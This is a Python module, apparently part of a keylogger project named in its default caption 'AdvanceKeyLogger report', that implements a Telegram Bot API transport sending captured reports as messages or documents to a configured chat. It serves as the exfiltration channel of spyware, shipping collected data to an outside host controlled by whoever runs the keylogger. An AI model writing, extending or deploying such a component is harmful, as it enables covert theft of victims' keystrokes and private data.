"""
Telegram transport using Bot API.

Sends reports to a chat via sendMessage or sendDocument.
"""
from __future__ import annotations

from typing import Any

import requests

from transport import register_transport
from transport.base import BaseTransport


@register_transport("telegram")
class TelegramTransport(BaseTransport):
    """Telegram Bot API transport."""

    def __init__(self, config: dict[str, Any]) -> None:
        super().__init__(config)
        self._bot_token = config.get("bot_token")
        self._chat_id = config.get("chat_id")
        self._timeout = float(config.get("timeout", 10))

    def connect(self) -> None:
        if not self._bot_token or not self._chat_id:
            raise ValueError("Telegram transport requires bot_token and chat_id")
        url = f"https://api.telegram.org/bot{self._bot_token}/getMe"
        response = requests.get(url, timeout=self._timeout)
        if not response.ok or not response.json().get("ok"):
            raise ValueError("Telegram bot token validation failed")
        self._connected = True

    def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
        if not self._connected:
            self.connect()
        meta = metadata or {}
        filename = meta.get("filename", "report.bin")
        caption = meta.get("caption", "AdvanceKeyLogger report")

        if len(data) < 3500 and meta.get("content_type") == "text/plain":
            return self._send_message(data.decode("utf-8", errors="replace"))
        return self._send_document(filename, data, caption)

    def disconnect(self) -> None:
        self._connected = False

    def _send_message(self, text: str) -> bool:
        url = f"https://api.telegram.org/bot{self._bot_token}/sendMessage"
        response = requests.post(
            url,
            data={"chat_id": self._chat_id, "text": text},
            timeout=self._timeout,
        )
        return response.ok

    def _send_document(self, filename: str, data: bytes, caption: str) -> bool:
        url = f"https://api.telegram.org/bot{self._bot_token}/sendDocument"
        response = requests.post(
            url,
            data={"chat_id": self._chat_id, "caption": caption},
            files={"document": (filename, data)},
            timeout=self._timeout,
        )
        return response.ok
